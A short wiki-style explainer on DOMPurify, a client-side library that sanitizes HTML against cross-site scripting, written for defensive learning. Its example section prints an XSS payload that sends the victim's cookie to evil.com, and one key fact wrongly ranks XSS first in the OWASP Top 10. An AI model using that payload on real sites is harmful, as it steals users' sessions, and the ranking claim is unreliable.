# DOMPurify

## What it is
Think of it like a TSA checkpoint for HTML: every piece of user-supplied markup gets scanned, and anything that looks like a weapon (script tags, event handlers, javascript: URIs) gets confiscated before it boards the DOM. DOMPurify is a client-side JavaScript library that sanitizes HTML strings by parsing them and stripping dangerous elements and attributes, producing safe output that can be injected into a page without executing malicious scripts.

## Why it matters
A comment section allows users to post rich text with bold and italic formatting. Without sanitization, an attacker submits `<img src=x onerror="document.location='https://evil.com?c='+document.cookie">` — the moment any user views that comment, their session cookie is exfiltrated. DOMPurify would have stripped the `onerror` attribute entirely, neutralizing the payload before it ever reached the DOM.

## Key facts
- DOMPurify defends specifically against **Cross-Site Scripting (XSS)**, the #1 web vulnerability class in OWASP Top 10
- It works by leveraging the **browser's own HTML parser** (DOMParser), meaning it benefits from the same parsing rules the browser uses — avoiding mismatch attacks that fool regex-based filters
- Default configuration blocks `<script>`, `javascript:` URIs, `data:` URIs in dangerous contexts, and all inline event handlers (`onclick`, `onerror`, etc.)
- It is **allowlist-based by default** — only known-safe tags and attributes survive; everything unrecognized is removed
- DOMPurify alone does **not** protect against stored XSS at the server level — it is a client-side last line of defense and should complement, not replace, server-side output encoding

## Related concepts
[[Cross-Site Scripting (XSS)]] [[Content Security Policy]] [[Input Validation]] [[Output Encoding]] [[DOM-based XSS]]